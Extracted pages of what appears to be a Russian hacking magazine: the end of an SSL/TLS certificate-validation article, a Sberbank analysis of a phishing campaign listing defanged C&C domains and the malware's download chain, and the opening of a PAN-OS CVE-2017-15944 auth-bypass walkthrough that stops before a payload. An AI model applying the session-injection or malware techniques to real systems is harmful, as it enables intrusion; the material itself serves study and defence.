Now, Pinterest, SafeNet (VPN client), SouthWest Airlines, Uber, US Bank — Access
Online, Western Union, WordPress, Yahoo! Finance, Yahoo! Mail.





     Небольшая выборка из списка уяз вимых мобильных приложений


ЛОГИЧЕСКИЕ УЯЗВИМОСТИ SSL/TLS-ПРОТОКОЛА
SSL/TLS‐соединения  всего  это го  и  многого  другого  софта  уязвимы
для широкого спектра MitM‐атак. При этом MitM‐атаку можно провести зачас‐
тую даже без под делки сертификатов и без похищения приватных
ключей, которыми серверы подписывают свои сертификаты. MitM‐атаку
можно провести, просто экс плуатируя логичес кие уязвимости, которые при‐
сутствуют в процедуре проверки SSL/TLS‐сертификата на стороне клиентско‐
го софта. В результате MitM‐зло умышленник может, например, собирать
токены авторизации, номера кредитных карт, имена, адреса и прочее —
у любого продав ца, который использует уязвимые веб‐приложения обработ‐
ки платежей.
   Поставщики мобильного софта, которые берут за основу семпл‐код Ad‐
Mob для связи своих приложений с AdMob‐акка унтом, тоже уяз вимы — они
позволяют атакующему  захватывать  учетные данные и получать доступ
ко всем его Google‐сервисам. К примеру, из‐за некорректной проверки сер‐
тификатов в таких мес сенджерах, как  Trillian и AIM, MitM‐злоумышленник
может похитить учетные данные для вхо да ко всем сервисам Google (включая
Gmail), Yahoo и также к сервисам Windows Live (в том числе SkyDrive). Сре ди
других  уязвимостей,  которыми  стра дает  современный  небраузерный
веб‐софт: использование неправиль ных регулярных выражений при срав‐
нении имени хоста; игнорирование результатов про верки корректности сер‐
тификата; случайное или преднамеренное отключение проверки.


ДРУГИЕ РАСПРОСТРАНЕННЫЕ УЯЗВИМОСТИ РЕАЛИЗАЦИИ
SSL/TLS-ПРОТОКОЛА
Ну и конечно же, нельзя забывать о том, что даже если в реализации
SSL/TLS‐протокола нет логических ошибок (если, конечно, кто‐то в это
еще  верит),  то защиту можно обойти, похитив приватный ключ, при‐
менив 0day‐экспло иты к таким вещам, как клавиату ры, браузеры, операци‐
онные системы, утилиты и прошивки, скомпромети ровав BGP‐маршрутиза‐
цию либо атаковав SSL/TLS по аппарат ным и/или программным обходным
каналам.





              Атака на SSL по аппа рат ным обходным каналам

Кроме того, злоумышленники могут выполнять практически невидимые MitM‐
атаки, злоупотребляя механизмом кеширования SSL/TLS‐сеансов, реали‐
зованным в классе SSLSessionCache. Этот механизм проверяет достовер‐
ность сертификатов только при первоначальном соединении, и при этом нес‐
пособен должным образом анну лировать сеанс свя зи после удаления сер‐
тификатов с устрой ства. Кроме того, пос ле перезагрузки Android‐устройства
(через опции «Перезапуск» или «Отключить питание») можно продолжать
видеть зашифрованный трафик час ти при ложений, которые после перезаг‐
рузки не запускались, но до перезагрузки работали. Так, например, происхо‐
дит с Google Maps. В презентации с Black Hat описано, как благодаря этим
недочетам кеширования  зло умышленник может совершенно прозрачно
для пользовате ля устанавливать и уда лять «невидимые сертификаты» и затем
устанавливать сетевое соединение с любым приложением.





                 Ретроспектива уяз вимого шифрования

Среди других распространенных уязвимостей реализации SSL/TLS‐протоко‐
ла можно отме тить уязвимое шифрование (см. пре зентацию с Black Hat
за 2016 год), повторное использование GCM (Galois/Counter Mode; счетчик
с аутентификацией Галуа) (источник — еще одна пуб ликация с Black Hat, тоже
за 2016 год), хитрость с CNG (CryptoAPI‐NG) в Schannel, некор ректную про‐
верку цепочки доверия, некорректную проверку имени хоста.





             Хитрость с CNG: вытягиваем секреты из Schannel

Некорректная про верка цепочки доверия представляет собой ситу ацию, ког‐
да веб‐приложение при нимает абсо лютно любой сертификат, в котором ука‐
зано корректное имя хоста, не проверяя при этом, каким центром сертифика‐
ции он был подписан. Это поз воляет перехватывать и дешифровывать пароли
и/или номера кредитных карт. А в некоторых случаях даже делать инъекцию
вредоносного кода.
  В Android‐софт данная уязвимость про никает, например, когда создается
кастомизированный  X509TrustManager‐интерфейс,  который  игнориру ет
исключения CertiﬁcateException. Или когда раз работчик софта вставляет в код
WebViews‐компонента вызов метода SslErrorHandler.proceed().


КОРЕНЬ ЗЛА SSL/TLS
Главная причина подавляющего большинства перечисленных уяз вимос тей —
ужасный  API‐дизайн  SSL/TLS‐библиотек  (в том  числе  JSSE, OpenSSL
и GnuTLS). А заодно и не менее ужасный дизайн биб лиотек передачи данных
(таких как cURL, Apache HttpClient и urllib), каждая из которых пред ставляет
собой высокоуровневую обертку для SSL/TLS‐биб лиотек. Не говоря уже
о middleware‐сервисах (таких как Apache Axis, Axis 2 или Codehaus XFire),
еще более высоко уровневых обертках, которые увеличивают «снежный ком»
ужасного дизайна.
   Вместо того чтобы вес ти с прикладным раз работчиком (зачастую далеким
от системного программирова ния) диалог на понят ном ему язы ке (в терминах
конфиденциальности и аутентифика ции), абстра гируясь от низкоуровневых
подробностей  реализации  SSL/TLS‐протоко ла,  эти   API  вываливают
на бедолагу кучу низкоуровневых SSL/TLS‐параметров, непонятных ему. Тре‐
буют от высокоуровневого софта, чтобы он пра вильно выставлял низ коуров‐
невые опции, реализовывал функции проверки имени хос та и заботился
об интерпретации возвращаемых низкоуровневыми операциями значений.
  В результате прикладные разработчики используют SSL/TLS API неп‐
равильно: ошибочно интерпретируют многообразие их параметров, опций,
побочных эффектов и возвра щаемых зна чений. Например:
 • Amazon’овская PHP‐биб лиотека Flexible Payments Service пытается вклю‐
   чить проверку имени хоста посредством установки параметра CURLOP‐
   T_SSL_VERIFYHOST в зна чение TRUE (в cURL‐библиотеке). Однако кор‐
   ректное значение по умолчанию для этого параметра — 2; если же прис‐
   воить ему значение TRUE, то этому параметру незаметно для разработ‐
   чика присваивается значение 1, и таким образом проверка сертификата
   отключается;
 • PHP‐библиотека PayPal Payments Standard приобрела ту же самую ошибку;
   причем в тот момент, когда предыду щая, уязвимая реализация обновля‐
   лась (то есть одну ошибку убра ли, другую добави ли);
 • другой пример — это Lynx, текстоориентированный браузер. Он проверя‐
   ет самоподписанные сертифика ты, но только в том случае, если GnuTL‐
   S’ная функция проверки сертифика та воз вра щает отрицательное зна‐
   чение. Однако эта самая функция для некото рых ошибок возвращает 0;
   в том числе в тех случаях, когда сертифика ты под писаны недоверенным
   органом. Из‐за это го цепочка проверки доверия в Lynx оказывается
   нарушена.

Кроме того, прик ладные раз работчики зачас тую неправильно понимают,
какие именно гарантии безопасности предос тавляет та или иная SSL/TLS‐
библиотека. Поэтому в дикой природе можно встретить клинические случаи,
когда в приложениях, принципиально нуж дающихся в защищенных ком‐
муникациях (например, взаимо действу ющих с пла тежным процессором),
используется SSL/TLS‐библиотека,  которая не проверяет  SSL/TLS‐сер‐
тификаты вообще. Более про заичные, но еще более убийственные случаи —
это когда разработчик какого‐нибудь из промежуточных слоев софта молча
отключает процедуру проверки SSL/TLS‐сертифика тов (он может сделать
это, например, для тестирования системы, а пос ле тестирования — забыть
вновь включить ее). При этом высокоуровневый программный код, исполь‐
зующий этот промежуточный слой, уверен, что про верка сертификатов про‐
изводится. Таким образом, ошибки SSL/TLS часто бывают скры ты в глу бине
одного или сразу нескольких промежуточных слоев‐библиотек — из‐за чего
обнаружить данную проблему ста новится практически невоз можно.
   Например, в JSSE (Java Secure Socket Extension) расширенный интерфейс
SSLSocketFactory API молча пропус кает проверку имени хос та, если поле al‐
gorithm в SSL‐клиенте уста новлено в NULL или в пус тую строку, а не в HTTPS.
Хотя данное обстоятель ство упомина ется в справочном руководстве JSSE,
многие  Java‐реализации  SSL‐протоколов  исполь зуют  SSLSocketFactory
без выполнения проверки имени хоста…


ЛОЖКА МЕДА В БОЧКУ ДЕГТЯ
На практике получается, что в основной мас се современного небраузерного
веб‐софта проверка SSL/TLS‐сертифика тов либо отключена совсем, либо
реализована неправиль но. На скриншоте представлена классификация акту‐
альных уязвимостей SSL/TLS‐про токола. Некоторые из этих уяз вимостей (но
не все) были описаны и/или упомянуты выше. Озна комиться с упомяну тыми,
но не описанными уязвимостями мож но, почитав материалы, перечисленные
в библиографии.





           Классификация акту альных для SSL/TLS уязвимостей

Чтобы добавить ложку меда в бочку дегтя, стоит отметить, что в указанном
выше источнике подробно, понят но, популярно и гра мотно описано (со ссыл‐
кой на RFC), как SSL должен реализовываться. Лучшего описания, которое
было бы технически точным и одновременно понятным, мы не встре чали. Так‐
же авторы разбирают самые распростра ненные SSL‐библиоте ки, с клас‐
сификацией  по  уровню  абстрагирования  (низ коуровневые/высокоуров‐
невые). Все с диаграмма ми и лаконичными алгоритмами в псевдокоде. Под‐
робно описаны уязвимости конкретных продуктов, с приведением некоррек‐
тного программного кода и указанием ошибок. Так что если вдруг у кого‐то
в очередной раз возникнет желание соз дать такую реализацию SSL/TLS‐
фреймворка, которая станет исключением из поговорки «хотели как лучше,
а получилось как всегда», то ма териал — идеальное для этого начало.


Биб лиог рафия
 1. Martin Georgiev, Rishita Anubhai, Subodh Iyengar. The Most Dangerous Code
    in the World: Validating SSL Certiﬁcates in Non‐Browser Software // Proceed‐
    ings of the 2012 ACM conference on computer and communications security.
   2012. P. 38–49.
 2. Tony Trummer. Mobile SSL Failures // Proceedings of the HITB Security Confer‐
   ence. 2015.
 3. Kellen Evan Person. How Ciphersuites Work: TLS in Pieces // 2017. URL:
    https://ﬂy.io/articles/how‐ciphersuites‐work/  (дата  обращения:  15  фев‐
   раля 2018).
 4. Catalin Cimpanu. Extended Validation (EV) Certiﬁcates Abused to Create In‐
   sanely  Believable  Phishing   Sites   //  BleepingComputer.  2017.  URL:
   https://www.bleepingcomputer.com/news/security/extended‐validation‐ev‐
    certiﬁcates‐abused‐to‐create‐insanely‐believable‐phishing‐sites/ (дата обра‐
   щения: 20 февраля 2018).
 5. David Adrian. A Retrospective on the Use of Export Cryptography // Black Hat.
   2016.
 6. Sean  Devlin.  Nonce‐Disrespecting  Adversaries:  Practical  Forgery  Attacks
   on GCM in TLS // Black Hat. 2016.
 7. Jake Kambic. Cunning with CNG: Soliciting Secrets from Schannel // Black Hat.
   2016.
 8. Valeria Bertacco. Torturing OpenSSL // Black Hat. 2012.
 9. Tom van Goethem. HEIST: HTTP Encrypted Information Can Be Stolen Through
   TCP‐Windows // Black Hat. 2016.
10. Artyom Gavrichenkov. Breaking Https With BGP Hijacking // Black Hat. 2016.
11. Chris Stone, Tom Chothia. Spinner: Semi‐Automatic Detection of Pinning with‐
   out Hostname Veriﬁcation // Proceedings of the Annual Computer Security Ap‐
    plications Conference (ACSAC) 2017.
12. Marco Ortisi. Recover a RSA Private Key from a TLS Session with Perfect For‐
   ward Secrecy // Black Hat. 2016.



Мне ние экспер та
Хочу обратить внимание на несколько моментов:
 1. SSL используется в качестве сертифика та для web‐сер‐
   веров,  фор сирующих  применение  HTTP(S)‐протокола.
   Это очень важно, на мой взгляд, так как, по сути, именно
   возможность шифрованной передачи данных с помощью     Иван
                                                          Пискунов   SSL  уберегает  нас  от  снифинга  паролей,  к примеру
   где‐нибудь в кафешке с бес платным Wi‐Fi (например, можно поднять фей‐
   ковую точку доступа и перехватывать пароли от VK, Сбера и другие
   в открытом виде, если бы использовался просто HTTP).
 2. К плохим новостям: SSL все равно не панацея, пос кольку данные могут
   быть перехвачены путем подмены корневого сертификата и реализации
   атаки «человек посередине», у меня на эту тему есть статья в блоге «Пе‐
   рехват и расшифровка HTTPS‐тра фика». Кроме того, в 2014 году пра‐
   вительство США сооб щило об уязвимос ти в текущей версии протокола.
   SSL должен быть исклю чен из работы в пользу TLS (см. CVE‐2014‐3566).
 3. И снова к хорошим новос тям: что мне нравит ся в асимметричном шиф‐
   ровании — это работа алго ритма Диффи — Хеллмана, когда для шиф‐
   рования сессии исполь зуется сеансовый ключ. На этой фиче я бы оста‐
   новился подробнее. Уяз вимос ти под этот алгоритм пока что нет!
ВЗЛОМ





                                                                 Юрий Дорошенко
                                                                                        @YuryDo
                                                                                            yurydo@gmail.com





                                                                             Артем Орешкин
                                                                                            AVOreshkin@sberbank.ru


][-ДЕТЕКТИВ:
ЦЕЛЕВАЯ АТАКА
НА СБЕРБАНК

 РАСКРЫВАЕМ ПОДРОБНОСТИ АРТ
 «ЗЛОВРЕДНЫЙ САНТА‐КЛАУС»




Накануне  праздников мы  все  с  головой  погружаемся
в задачи, которые нужно успеть завершить, бдительность
офисных работников притупляется, и это на руку хакерам.
Недавно мы столкнулись с серией кибератак на компании
финансового сектора России, в том числе и Сбербанк.
На первый взгляд, это были привычные фишинговые рас‐
сылки на адреса банков ских сотрудников. Но детальный раз‐
бор  и  анализ  выявили  постоянно  эволюционирующую
целенаправленную ата ку.


ХРОНОЛОГИЯ
Как все было организовано? Общая хро ноло гия зафиксированных атак:
 • все рассылки производились в раз гар рабочего дня (часовой пояс
   UTC+3);
 • первая атака — последняя неделя декабря 2017 года;
 • вторая атака — вторая рабочая неделя 2018 года;
 • третья атака — третья рабочая неделя 2018 года.

Фишинговые письма рассылались с подготовленных за несколько дней
до вредоносных рассылок почтовых серверов. Каж дая атака сопровождалась
новым набором доменных имен, обновлен ной серверной инфраструктурой,
регулярно дорабатываемым инс тру ментарием. Все  зарегистрированные
доменные имена име ли сходс тво с доменными именами компаний, с которы‐
ми взаимодействуют рос сийские финансовые организации.
  Почему мы объединили все события:
 • списки рассылок совпадали с точностью 85%;
 • все письма были грамотно написа ны на русском языке;
 • механизмы и инстру менты, использовавшиеся в атаках, имели нез‐
   начительные различия;
 • все письма име ли иден тичную структуру и были отправлены с помощью
   почтового сервера Exim 4.80;
 • использовались сертифика ты, выписанные удостоверяющими центрами
  Comodo CA  Ltd.,  Digicert,  Inc. Указанные в сертификатах компании,
   которым они были выданы: Dazzle Solutions Ltd., Bright Idea Enterprise Ltd.;
 • использовалось два спо соба распространения вредоносного ПО: ссылка
   в письме, ведущая на исполня емый jar‐файл; вложенный файл, эксплуати‐
  рующий опубликованную уязвимость CVE‐2017‐11882.


Как ты уже догадался, эта ата ка не удалась. Средства защиты банка не допус‐
тили проникновения зло умышленников в инфраструктуру, а инс трументы
и механизмы хакеров попали под микроско пы наших специалистов.



ПРИРОДА АТАК. РАЗБОР ПИСЕМ
Рассылка писем производилась с доменов:
 • billing‐cbr[.]ru
 • bankosantantder[.]com
 • oracle‐russia[.]info
 • cards‐nspk[.]ru
 • regdommain[.]com

Доменные имена регис трировались незадол го до проведения атак. Были
установлены несколь ко успешных попыток подделки адреса отправителя
письма. Анализ структуры писем показал, что все письма были отправлены
с помощью почтового сервера Exim 4.80.



               Заголо вок агента фишингового письма

Структура фишинговых писем — text/html, кодировка — quoted‐printable UTF‐
8.





        Заголовки, описывающие структуру фишингового письма


ПРИРОДА АТАКИ. ПЕРВЫЙ ЭТАП АТАКИ — ВРЕДОНОСНЫЙ URL
Все адреса, указанные в письмах, вели на стра ницы, в HTML‐коде которых
инициализировалась загрузка вредонос ного Java‐апплета signed.jar. Помимо
этого, страницы содержали закодированные в Base64 фрагменты исполня‐
емого кода, предназначенного для скачивания вредоносного ПО. Данная
функциональность также дублировалась в Java‐апплете.





  Base64 encoded фрагмент, предназна ченный для скачивания вредонос‐
  ного Java‐апплета

Фактически, когда жертва переходила по ссылке, запускался signed.jar. Пос‐
кольку jar‐файл подписан действительным сертификатом, выданным Comodo
CA Ltd. / Digicert, Inc., он про ходил проверку нас троек безопасности Java‐
машины. Стоит отметить, что при использовании параметров Java по умол‐
чанию для запуска апплета требует ся подтверждение пользовате ля. Наибо‐
лее простой способ запретить  запуск апплетов  в привилегированном
режиме — отклю чить опцию Allow user to grant permissions to signed content
в настройках Java.





              Содержимое вредонос ного jar‐файла





                Выданный хакерам сертификат


ДИНАМИЧЕСКАЯ БИБЛИОТЕКА MAIN.DLL/MAIN64.DLL
Вредоносное ПО было раз работа но с при менением механиз мов Java Native
Interface (JNI), позволяющих осущест влять вызов нативного кода из Java‐
машины и наоборот. Во время исполнения jar‐апплета опре деля лась раз‐
рядность ОС с последующим извлечением необходимой динамической DLL‐
библиотеки:
 • main.dll для ОС семейства Windows раз ряднос ти х86;
 • main64.dll для ОС семейства Windows раз ряднос ти x64.





              Метод java_main_inject в signed.jar

После извлечения main.dll/main64.dll сохраня ется на диск и запускается
на исполне ние с помощью функции System.load() в контексте виртуальной
машины Java. Код из main.dll/main64.dll динамически получает адреса фун‐
кций Windows API для работы с HTTP‐про токолом из библиоте ки wininet.dll,
обращается  к  URL  hxxps://servicenetupdate[.]com/yroyiuymsa,  загружает
и расшифровывает расположенный по это му адресу файл int.dll (для рас‐
шифровки использовался алго ритм XOR с обратной связью), пос ле чего
управление передается рас шифрованному коду.





   main.dll — формирова ние HTTP‐запроса для получения загрузчика
  модулей


ПРИРОДА АТАКИ. ПЕРВЫЙ ЭТАП АТАКИ — ВРЕДОНОСНОЕ
ПОЧТОВОЕ ВЛОЖЕНИЕ
Вредоносное ПО распространялось через почтовое вложение, в некоторых
случаях прямой URL на RTF‐файл hxxp://oracle‐russia.info/Oracle_RDBMS.rtf
(3‐я атака).
   Если файл открывали, а необходимых обновлений не было, это вело к экс‐
плуатации известной с нояб ря 2017 года уяз вимости в модуле редактора
формул (CVE‐2017‐11882). Исполнялся компонент вредоносного ПО в виде
scr‐файла, содержавшего .NET‐скрипт, который загружал PowerShell‐сце‐
нарий.
  В ходе детального анализа scr‐файла было уста новлено, что его содер‐
жимое зашифровано с помощью побитового алгоритма XOR с байтовым клю‐
чом 0xА5.





  Вредоносный PowerShell‐сценарий после снятия побитового XOR с клю‐
  чом 0xA5





  Фрагмент в фор мате Base64, модифи цированном, чтобы усложнить раз‐
  бор





  Бинарный код, извлеченный из Base64‐фрагмента, отвечавший
  за получе ние загрузчика модулей

После  исполне ния  PowerShell‐сценария  соз давалось  SSL‐соединение
с узлом hxxps://teredo‐update.com (3‐я ата ка) и затем скачивался загрузчик
модулей int.dll.


ПРИРОДА АТАКИ. ВТОРОЙ ЭТАП АТАКИ — ЗАГРУЗЧИК МОДУЛЕЙ
Файл int.dll, получаемый в результате как первого, так и второго способов
атаки, — это исполняемый файл Windows PE32 (DLL), предназначенный
для загрузки других модулей вредоносного ПО с сервера управления.
В качестве адре са сервера управления во время первой атаки использовал‐
ся URL hxxps://help‐desc‐me[.]com/<псевдослу чайная строка из ASCII‐сим‐
волов в нижнем регистре>/.
  С периодичностью в одну секунду загрузчик модулей обращал ся к серверу
управления по протоколу HTTP пос редс твом GET‐запросов. В случае получе‐
ния HTTP‐ответа с кодом 200 загружались зашифрованные модули и дешиф‐
ровывались. После этого загрузчик запус кал их в контексте своего процес‐
са — это весьма распростра ненный метод зат руднить детектирование вре‐
доносного ПО. Результаты работы модулей отправлялись на сервер управле‐
ния с помощью метода HTTP POST.
   Загрузчик использовал дос таточно оригинальный способ шифрования —
бинарные данные, содержавшие загружаемые модули, были пред ставлены
в формате human readable content.





  Human readable фрагменты, содержавшие дополнительный модуль вре‐
  доносного ПО





  Часть кода загрузчика, отвечающая за декоди рова ние получаемой наг‐
  рузки

В ходе динамического анализа на протяжении проводимых атак удалось
получить три загружаемых модуля:
 • исполняемый файл формата Windows PE (DLL) — модуль для соз дания
   скриншотов, загружа ется каждый раз, когда с управляющего сервера пос‐
   тупает задача сделать скриншот;
 • исполняемый файл фор мата Windows PE (DLL) — модуль для получения
   списка запущенных процессов (имена исполняемых файлов и пути к ним).
  После выполнения отправляет данные обратно на управля ющий сервер;
 • полезная нагрузка Cobalt Strike Beacon версии 3.8, выдаваемая только
   в  случае принятого  хакерами положительного решения  на  основе
   полученной информации о зараженной системе.





                  Код получения скриншота экра на





             Код получения списка запущенных процессов





  Атака через вредоносный URL в письме, ведущий на исполняемый jar‐
  файл


ОБЩАЯ СХЕМА АТАКИ
В результате анализа установлена общая схема атак.





  Атака через вложенный файл, экс плуатирующий уязвимость CVE‐2017‐
  11882

Серверы C&C № 1 использовались хакера ми для размещения загрузчика
модулей, скачиваемого в момент вто рого этапа атаки. C&C № 2 — реальные
управляющие серверы для уда ленного взаимодей ствия. Также они исполь‐
зовались  для  передачи  дополнительных  модулей,  предназначавшихся
для дальнейшего потенциального распространения в сети жертвы.
  Список C&C‐серверов:
 • servicenetupdate[.]com
 • bankosantantder[.]com
 • oracle‐russia[.]info
 • help‐desc‐me[.]com
 • billing‐cbr[.]ru
 • teredo‐update[.]com
 • techupdateslive[.]com
 • getfreshnews[.]com


ИЗМЕНЕНИЯ ПО ХОДУ ПОВТОРНОГО ПРОВЕДЕНИЯ АТАК
Первая и вторая атаки:
 • Main.class — строковые константы обернуты в Base64;
 • main.dll — изменен ключ кодиро вания;
 •  int.dll — заменена полезная нагрузка и ключ кодирования;
 • появился второй спо соб рас простра нения через RTF‐файл (CVE‐2017‐
   11882).

Вторая и третья атаки:
 •  int.dll — заменена полезная нагрузка и ключ кодирования;
 • в тело фишингового пись ма добавлена прямая ссылка на scr‐файл.


ЗАКЛЮЧЕНИЕ
Без подобных исследований невоз можно выс троить надежную систему
защиты, так как современные средства не справляются с таргетированными
атаками. Внутри Службы кибербезопас ности нам уда лось выс троить процес‐
сы, позволяющие проводить детальный анализ кибератак и вредоносов.
В рамках Security Operation Center работают команды Threat Intelligence,
Forensics и RedTeam. Внутри SOC акку мулируются инди каторы компромета‐
ции, полученные благодаря вза имо действию с организациями‐партнерами,
такими как Bizone и ГосСОПКА. И эта система уже не раз доказала свою
эффективность.
  В конце прошлого года мы ста ли свидетелями начала нового этапа атак
на финансовые организа ции России. Нельзя сказать, что количество атак
резко увеличилось, но можно однозначно отметить, что их технический уро‐
вень растет — публикуемые уяз вимос ти в крат чайшее время принимаются
на вооружение хакерами. Помимо этого, фишинговые рассылки все чаще
имеют признаки целенаправленных и тщатель но подготовленных дей ствий,
а на замену изученным и известным методам злоумышленников приходят
обновленные инструменты и механики. Компетенции наших специалистов
позволяют осуществлять детальный раз бор вредонос ного кода с примене‐
нием средств статического и динамического анализа, а также своевременно
изучать и осваивать новые подходы хакеров. Это противостояние никогда
не прекратится, но к нему можно быть подготовленным — это то, к чему мы
стремимся и ради чего делимся нашим опытом.
ВЗЛОМ
      ГАСИМ
   ФАЙРВОЛ

           УЧИМСЯ ЭКСПЛУАТИРОВАТЬ
           КРИТИЧЕСКУЮ УЯЗВИМОСТЬ
             В ОС PALO ALTO NETWORKS





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





Palo Alto Networks — один из круп нейших секьюрити‐провай‐
деров. Файрволы этой компании работают на собственной
ОС с приятным русскому уху названием PAN‐OS. В ней‐то
недавно и нашли уязвимости, которые приводят к удален‐
ному  исполнению  кода  от  имени  суперпользователя
без какой‐либо авторизации. Хочешь узнать, как такие серь‐
езные ребята смогли так обла жаться? Давай раз беремся!


Всего было найдено три уязвимос ти в реализации веб‐интерфейса управле‐
ния аппаратными брандма уэрами. Цепочка из них позволяет выпол нить про‐
извольный код от име ни суперпользователя и скомпрометировать всю сис‐
тему. Они получили один идентифика тор CVE‐2017‐15944. Давай пос мотрим
на них поближе.
  Для тестирования подой дет любая из этих версий системы:
 • PAN‐OS 6.1.18 и ниже,
 • PAN‐OS 7.0.18 и ниже,
 • PAN‐OS 7.1.13 и ниже,
 • PAN‐OS 8.0.5 и ниже.

Да, уязвимы почти все актуальные ветки, но вот одна беда — просто так
заполучить их не выйдет, потому что PAN‐OS пос тавля ется только в комплекте
с фирменными аппарат ными файрволами. Если у тебя завалял ся такой
под рукой, то ты, конеч но же, можешь перейти на официальный сайт в раздел
загрузок и скачать нужную прошивку. Если такой возможности нет, то, увы,
поднять стенд не получится и придется наб людать за ходом эксплу атации
в статье. Если придумаешь иной способ, не забудь сообщить. ;)





          Страница авто риза ции в панели управления PAN‐OS


ОБХОД АВТОРИЗАЦИИ
Разумеется, все функции панели управления закрыты от любопытных глаз
при помощи логина и пароля, и первый баг, о котором пойдет речь, —
это небольшой ее обход. В качестве веб‐сервера в PAN‐OS используется
некая солянка из технологий, которая включает несколько самописных биб‐
лиотек.
   Конфигурационный  файл  /etc/appweb3/conf/common.conf  содержит
список объектов, которые закрыты авто ризацией. Выглядят такие секции сле‐
дующим образом:


/etc/appweb3/conf/common.conf
144: <Location /php/monitor>
145:   SetHandler phpHandler
146:   panAuthCheck on
147: </Location>
148: <Location /php/utils>
149:   SetHandler phpHandler
150:   panAuthCheck on
151: </Location>
152: <Location /php>
153:   panAuthCheck on
154: </Location>
155: <Location /PAN_help>
156:   panAuthCheck on
157: </Location>
...
162: <Location /upload>
163:      panAuthCheck on
164:      AddInputFilter uploadFilter
165: </Location>

Директивы panAuthCheck, установленные в on, закрывают указанный URI
авторизационной фор мой. При попытке перей ти по такому адресу текущая
сессия пользователя про веря ется на наличие валидной аутентификации.
За это отвечает библиотека /usr/local/lib/shobjs/libpanApiWgetFil‐
ter.so.


/etc/appweb3/conf/common.conf
60: LoadModulePath "/usr/local/lib/shobjs:/usr/local/lib32/shobjs"
61: LoadModule panappweb3Module libpanappweb3
62: LoadModule panApiWgetFilter libpanApiWgetFilter
63: LoadModule panAuthFilter libpanApiWgetFilter

Затем функция openAuthFilter про веря ет наличие сес сионной куки PHPSES‐
SID и передает управление функции readSessionVarsFromFile для загрузки
и извлечения нужных переменных (dloc и user) из файла сес сии.


libpanApiWgetFilter.c
1282: void __cdecl openAuthFilter(MaQueue_0 *q)
1283: {
...
1310:   if ( getCookieValues(&myFuncResult, ptrMyAuthFilter) )
...
1320:     v1 = maGetStageData(ptrMyAuthFilter‐>conn, "panAuthFilter.
PHPSESSID");
...
1321:     hasSessionCookie = v1 != 0;
1322:     if ( v1 != 0 )
1323:     {
1324:       if ( readSessionVarsFromFile(ptrMyFuncResult, ptrMyA
uthFilter) )


libpanApiWgetFilter.c
818: pan_result_t __cdecl readSessionVarsFromFile(ptrFuncResult
result, ptrAuthFilter me)
819: {
...
845:   ssid = myGetStageData(me‐>conn, "panAuthFilter.PHPSESSID");
...
847:   path = (pan_char_t *)__pan_calloc(me‐>allocator, 1, pathSize);
848:   if ( path )
849:   {
850:     sprintf(path, "%s%s%s", "/tmp/", "sess_", ssid);
851:     fp = fopen(path, "r");

Проблемное место — это кас томная реализация алгоритма, который читает
переменные сессии. Вмес то того чтобы вос пользоваться какой‐нибудь стан‐
дартной функцией для работы с сериализованными данными, разработчики
написали свою, которая основана на цепочке вызовов strtok для разбиения
строки на части.


libpanApiWgetFilter.c
886:             fseek(fp, 0, 0);
887:             if ( fread(buf, sbuf.st_size, 1u, fp) == 1 )
888:             {
889:               fclose(fp);
890:               buf[sbuf.st_size] = 0;
891:               delim = "|";
892:               remaining = 0;
893:               skey = strtok_r(buf, "|", &remaining);
894:               do
895:               {
896:                 if ( !skey )
897:                   break;
898:                 if ( !remaining )
899:                   break;
900:                 remaining2 = 0;
901:                 ptType = strtok_r(remaining, ":", &remaining2);
902:                 if ( !ptType )
903:                   break;
904:                 strtok_r(0, ":", &remaining2);
...
920:                   skey = strtok_r(remaining2, delim, &remaining)
;
...
924:                   tSkeyValue = strtok_r(0, ";", &remaining2);
925:                   if ( *ptType == 115 )
926:                   {
927:                     tSkey = 0;
928:                     if ( !strcasecmp("dloc", skey) )
929:                     {
930:                       tSkey = "panAuthFilter.dloc";
931:                     }
932:                     else if ( !strcasecmp("user", skey) )
933:                     {
934:                       tSkey = "panAuthFilter.user";
935:                     }
936:                     if ( tSkey && tSkeyValue && *tSkeyValue )
937:                     {
...
950:                   skey = strtok_r(0, delim, &remaining2);
951:                   remaining = remaining2;
...
954:               while ( skey && *skey != 10 );
955:               if ( !maGetStageData(me‐>conn, "panAuthFilter.
user") )
956:                 mprLog(
957:                   globalMpr,
958:                   0,
959:                   "panAuthFilter:panAuthFiler: management
cookie missing. file size %d",
960:                   sbuf.st_size);
961:               if ( !maGetStageData(me‐>conn, "panAuthFilter.
dloc") )
962:                 mprLog(globalMpr, 0, "panAuthFilter:panAut
hFilter: dloc cookie missing. file size %d", sbuf.st_size);
963:               __pan_free(me‐>allocator, path, pathSize);
964:               __pan_free(me‐>allocator, buf, bufSize);
965:               v3 = 0;
966:             }

Сам формат обрабатываемых данных похож на то, что возвращает функция
serialize в PHP.


имя_переменной|s:длина_переменной:"значение"; имя_переменной|s:длина_
переменной:"еще_значение";

И так далее. Для раз деления описаний переменных используется точка
с запятой. Увы, такая реализация содержит логические изъ яны, которые
помогут нам в дальнейшей эксплуата ции. Например, мы можем выполнять
банальные инъекции, используя в качес тве их значений пос ледовательность
";. Так можно управлять зна чением переменной user.
   Теперь осталось найти возможность, которая поз волит нам записать дан‐
ные в файл сессии. Посмотрим на скрипт cms_changeDeviceContext.esp,
в котором происходит работа с переменной $_SESSION. Его можно вызвать
без авторизации.


/var/appweb/htdocs/esp/cms_changeDeviceContext.esp
02: WebSession::start();
03: require 'panmodule.php';
04:
05: foreach ($_SESSION as $key => $value) {
06:  if (strpos($key, "dSId_") === 0) {
07:   unset($_SESSION[$key]);
08:  }
09: }
10: /** @noinspection PhpUndefinedFunctionInspection */
11: $string_argout = panUserSetDeviceLocation($_SESSION['user'], $
_GET['device'], 0, new php_string_argout());

Функция panUserSetDeviceLocation находится в подгружаемой библиотеке
/usr/lib/php/modules/panmodule.so.


/etc/appweb3/php.ini
455: extension_dir = "/usr/lib/php/modules"
...
552: extension=panmodule.so

Чтобы посмотреть, что происхо дит с переданными в функцию параметрами,
нам пригодится дизассемблер IDA. Благо сей час есть бесплатная версия —
ее нам вполне хватит, потому что библиотека скомпилирована для архитек‐
туры Intel 80386.





        Дизассемблирование функции panUserSetDeviceLocation

Атрибут deviceStr попадает в функцию из URL параметра device (перемен‐
ная $_GET['device']). Далее зна чение попада ет в panPhpConvertString‐
ToLoc.


panmodule.c
18464: pan_uint32_t __cdecl panUserSetDeviceLocation(char *cookie,
char *deviceStr, int useWriteFmt, php_string_argout *string_argout)
18465: {
...
18498:   if ( panPhpConvertStringToLoc(deviceStr, &dloc) )

Логика работы со значением пример но следующая.





          Логика работы функции panPhpConvertStringToLoc

